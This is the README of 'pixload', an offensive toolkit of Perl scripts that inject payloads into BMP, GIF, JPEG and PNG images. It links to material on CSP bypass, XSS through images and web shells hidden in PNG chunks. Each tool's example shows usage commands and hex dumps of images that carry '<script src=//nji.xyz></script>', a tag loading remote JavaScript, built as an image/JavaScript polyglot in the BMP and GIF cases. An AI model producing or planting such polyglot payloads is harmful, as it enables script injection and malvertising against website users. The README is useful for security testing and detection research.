# pixload -- Image Payload Creating tools

## DESCRIPTION

Set of tools for creating/injecting payload into images.

Useful references for better understanding of `pixload` and its use-cases:

- [Bypassing CSP using polyglot JPEGs](https://portswigger.net/blog/bypassing-csp-using-polyglot-jpegs)

- [Hacking group using Polyglot images to hide malvertising attacks](https://devcondetect.com/blog/2019/2/24/hacking-group-using-polyglot-images-to-hide-malvertsing-attacks)

- [Encoding Web Shells in PNG IDAT chunks](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

- [An XSS on Facebook via PNGs & Wonky Content Types](https://whitton.io/articles/xss-on-facebook-via-png-content-types/)

- [Revisiting XSS payloads in PNG IDAT chunks](https://www.adamlogue.com/revisiting-xss-payloads-in-png-idat-chunks/)

If you want to encode a payload in such a way that the resulting binary blob is
both valid x86 shellcode and a valid image file, I recommend you to look
[here](https://warroom.securestate.com/bmp-x86-polyglot/) and
[here](https://github.com/rapid7/metasploit-framework/blob/master/modules/encoders/x86/bmp_polyglot.rb).

## SETUP

The following Perl modules are required:

  * GD

  * Image::ExifTool

  * String::CRC32

On `Debian-based` systems install these packages:

```sh
sudo apt install libgd-perl libimage-exiftool-perl libstring-crc32-perl
```

On `OSX` please refer to [this workaround](https://github.com/chinarulezzz/pixload/issues/3)
(thnx 2 @iosdec).

## TOOLS

### bmp.pl

BMP Payload Creator/Injector.

##### Usage

```sh
./bmp.pl [-payload 'STRING'] -output payload.bmp

If the output file exists, then the payload will be injected into the
existing file.  Else the new one will be created.
```

##### Example

```sh
./bmp.pl -output payload.bmp

[>|       BMP Payload Creator/Injector      |<]

    https://github.com/chinarulezzz/pixload


[>] Generating output file
[✔] File saved to: payload.bmp

[>] Injecting payload into payload.bmp
[✔] Payload was injected successfully

payload.bmp: PC bitmap, OS/2 1.x format, 1 x 1

00000000  42 4d 2f 2a 00 00 00 00  00 00 1a 00 00 00 0c 00  |BM/*............|
00000010  00 00 01 00 01 00 01 00  18 00 00 00 ff 00 2a 2f  |..............*/|
00000020  3d 31 3b 3c 73 63 72 69  70 74 20 73 72 63 3d 2f  |=1;<script src=/|
00000030  2f 6e 6a 69 2e 78 79 7a  3e 3c 2f 73 63 72 69 70  |/nji.xyz></scrip|
00000040  74 3e 3b                                          |t>;|
00000043
```

### gif.pl

GIF Payload Creator/Injector.

##### Usage

```sh
./gif.pl [-payload 'STRING'] -output payload.gif

If the output file exists, then the payload will be injected into the
existing file.  Else the new one will be generated.
```
##### Example

```sh
./gif.pl -output payload.gif

[>|      GIF Payload Creator/Injector       |<]

    https://github.com/chinarulezzz/pixload


[>] Generating output file
[✔] File saved to: payload.gif

[>] Injecting payload into payload.gif
[✔] Payload was injected successfully

payload.gif: GIF image data, version 87a, 10799 x 32

00000000  47 49 46 38 37 61 2f 2a  20 00 80 00 00 04 02 04  |GIF87a/* .......|
00000010  00 00 00 2c 00 00 00 00  20 00 20 00 00 02 1e 84  |...,.... . .....|
00000020  8f a9 cb ed 0f a3 9c b4  da 8b b3 de bc fb 0f 86  |................|
00000030  e2 48 96 e6 89 a6 ea ca  b6 ee 0b 9b 05 00 3b 2a  |.H............;*|
00000040  2f 3d 31 3b 3c 73 63 72  69 70 74 20 73 72 63 3d  |/=1;<script src=|
00000050  2f 2f 6e 6a 69 2e 78 79  7a 3e 3c 2f 73 63 72 69  |//nji.xyz></scri|
00000060  70 74 3e 3b                                       |pt>;|
00000064
```

### jpg.pl

JPG Payload Creator/Injector.

##### Usage

```sh
./jpg.pl [-payload 'STRING'] -output payload.jpg

If the output file exists, then the payload will be injected into the
existing file.  Else the new one will be created.
```

##### Example

```sh
./jpg.pl -output payload.jpg

[>|      JPEG Payload Creator/Injector      |<]

    https://github.com/chinarulezzz/pixload


[>] Generating output file
[✔] File saved to: payload.jpg

[>] Injecting payload into comment tag
[✔] Payload was injected successfully

payload.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 96x96,
segment length 16, comment: "<script src=//nji.xyz></script>", baseline,
precision 8, 32x32, components 3

00000000  ff d8 ff e0 00 10 4a 46  49 46 00 01 01 01 00 60  |......JFIF.....`|
00000010  00 60 00 00 ff fe 00 21  3c 73 63 72 69 70 74 20  |.`.....!<script |
00000020  73 72 63 3d 2f 2f 6e 6a  69 2e 78 79 7a 3e 3c 2f  |src=//nji.xyz></|
00000030  73 63 72 69 70 74 3e ff  db 00 43 00 08 06 06 07  |script>...C.....|
00000040  06 05 08 07 07 07 09 09  08 0a 0c 14 0d 0c 0b 0b  |................|
00000050  0c 19 12 13 0f 14 1d 1a  1f 1e 1d 1a 1c 1c 20 24  |.............. $|
00000060  2e 27 20 22 2c 23 1c 1c  28 37 29 2c 30 31 34 34  |.' ",#..(7),0144|
00000070  34 1f 27 39 3d 38 32 3c  2e 33 34 32 ff db 00 43  |4.'9=82<.342...C|
00000080  01 09 09 09 0c 0b 0c 18  0d 0d 18 32 21 1c 21 32  |...........2!.!2|
00000090  32 32 32 32 32 32 32 32  32 32 32 32 32 32 32 32  |2222222222222222|
*
...
000002a6
```

### png.pl

PNG Payload Creator/Injector.

##### Usage

```sh
./png.pl [-payload 'STRING'] -output payload.png

If the output file exists, then the payload will be injected into the
existing file.  Else the new one will be created.
```

##### Example

```sh
./png.pl -output payload.png

[>|      PNG Payload Creator/Injector       |<]

    https://github.com/chinarulezzz/pixload


[>] Generating output file
[✔] File saved to: payload.png

[>] Injecting payload into payload.png

[+] Chunk size: 13
[+] Chunk type: IHDR
[+] CRC: fc18eda3
[+] Chunk size: 9
[+] Chunk type: pHYs
[+] CRC: 952b0e1b
[+] Chunk size: 25
[+] Chunk type: IDAT
[+] CRC: c8a288fe
[+] Chunk size: 0
[+] Chunk type: IEND

[>] Inject payload to the new chunk: 'pUnk'
[✔] Payload was injected successfully

payload.png: PNG image data, 32 x 32, 8-bit/color RGB, non-interlaced

00000000  89 50 4e 47 0d 0a 1a 0a  00 00 00 0d 49 48 44 52  |.PNG........IHDR|
00000010  00 00 00 20 00 00 00 20  08 02 00 00 00 fc 18 ed  |... ... ........|
00000020  a3 00 00 00 09 70 48 59  73 00 00 0e c4 00 00 0e  |.....pHYs.......|
00000030  c4 01 95 2b 0e 1b 00 00  00 19 49 44 41 54 48 89  |...+......IDATH.|
00000040  ed c1 31 01 00 00 00 c2  a0 f5 4f ed 61 0d a0 00  |..1.......O.a...|
00000050  00 00 6e 0c 20 00 01 c8  a2 88 fe 00 00 00 00 49  |..n. ..........I|
00000060  45 4e 44 ae 42 60 82 00  00 00 00 00 00 00 00 00  |END.B`..........|
00000070  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
000000c0  00 1f 70 55 6e 6b 3c 73  63 72 69 70 74 20 73 72  |..pUnk<script sr|
000000d0  63 3d 2f 2f 6e 6a 69 2e  78 79 7a 3e 3c 2f 73 63  |c=//nji.xyz></sc|
000000e0  72 69 70 74 3e 9d 11 54  97 00 49 45 4e 44        |ript>..T..IEND|
000000ee
```

## LICENSE

WTFPL

## LEGAL DISCLAIMER

The author does not hold any responsibility for the bad use
of this tool, remember that attacking targets without prior
consent is illegal and punished by law.

## DONATION

BTC: bc1qu7v2h9hq45cx5x0xgy4438ayn2z2ec4af50rdz

![btc-qrcode.png](btc-qrcode.png)
